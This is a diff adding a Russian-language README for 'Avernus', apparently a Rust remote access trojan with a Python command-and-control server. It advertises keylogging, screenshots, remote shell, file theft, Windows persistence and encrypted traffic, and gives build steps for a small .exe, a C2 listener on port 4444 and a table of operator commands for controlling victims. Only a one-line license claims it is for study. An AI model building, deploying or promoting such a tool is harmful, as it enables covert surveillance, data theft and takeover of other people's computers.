@@ -1,0 +1,144 @@
+# Avernus RAT (Rust)
+
+**Avernus** — это легковесный RAT-агент на Rust с управлением через Python C2-сервер.  
+Поддерживает Windows, собирается в один `.exe` размером до 300 КБ.
+
+---
+
+## 📦 Что внутри
+
+- ✅ Консольное управление (cmd / sh)
+- ✅ Кейлоггер
+- ✅ Скриншоты
+- ✅ Запись с микрофона (заглушка)
+- ✅ Системная информация
+- ✅ Загрузка файлов с машины
+- ✅ Персистенция (автозапуск в Windows)
+- ✅ Шифрование трафика XOR
+- ✅ C2-сервер на Python
+
+---
+
+## 🔧 Установка Rust
+
+Если сайт `rustup.rs` не открывается, скачай установщик с зеркала:
+
+> [https://mirrors.ustc.edu.cn/rust-static/rustup/dist/i686-pc-windows-msvc/rustup-init.exe](https://mirrors.ustc.edu.cn/rust-static/rustup/dist/i686-pc-windows-msvc/rustup-init.exe)
+
+Запусти, нажимай `Enter` до конца установки.  
+После установки проверь:
+
+```cmd
+rustc --version
+cargo --version
+```
+
+---
+
+## 🧩 Настройка зеркала для Cargo (ускоряет загрузку зависимостей)
+
+Создай файл:
+
+```cmd
+%USERPROFILE%\.cargo\config.toml
+```
+
+И вставь:
+
+```toml
+[source.crates-io]
+registry = "https://github.com/rust-lang/crates.io-index"
+replace-with = 'ustc'
+
+[source.ustc]
+registry = "git://mirrors.ustc.edu.cn/crates.io-index"
+```
+
+---
+
+## 📁 Структура проекта
+
+```
+Avernus_Rust/
+├── client/
+│   ├── Cargo.toml
+│   └── src/
+│       └── main.rs
+├── c2_server/
+│   └── server.py
+├── build.bat
+└── Avernus.exe          (появляется после сборки)
+```
+
+---
+
+## 🛠️ Сборка агента
+
+Запусти `build.bat` из корня проекта:
+
+```cmd
+build.bat
+```
+
+Или вручную:
+
+```cmd
+cd client
+cargo build --release
+copy target\release\avernus_rat_rust.exe ..\Avernus.exe
+```
+
+Готовый `Avernus.exe` появится в корневой папке.
+
+---
+
+## 🚀 Запуск C2-сервера
+
+```cmd
+cd c2_server
+python server.py
+```
+
+По умолчанию сервер слушает порт `4444`.
+
+---
+
+## 🎮 Команды C2-сервера
+
+| Команда | Описание |
+|---------|----------|
+| `help` | Справка |
+| `list` | Список активных клиентов |
+| `select <id>` | Выбрать клиента |
+| `shell <cmd>` | Выполнить команду на клиенте |
+| `screenshot` | Сделать скриншот |
+| `mic` | Записать микрофон (заглушка) |
+| `keylog_start` | Запустить кейлоггер |
+| `keylog_stop` | Остановить кейлоггер |
+| `download <path>` | Скачать файл с клиента |
+| `persist` | Добавить автозапуск |
+| `info` | Показать информацию о системе |
+| `exit_client` | Завершить агента |
+
+---
+
+## 📦 Зависимости Rust (устанавливаются автоматически)
+
+```toml
+tokio = { version = "1.0", features = ["full"] }
+aes = "0.8"
+cbc = "0.1"
+screenshots = "0.2"
+cpal = "0.15"
+rdev = "0.6"
+whoami = "1.5"
+sysinfo = "0.30"
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+walkdir = "2.5"
+```
+
+Все зависимости скачаются автоматически при первом запуске `cargo build`.
+
+
+**Лицензия:** только для изучения и тестирования в контролируемой среде.
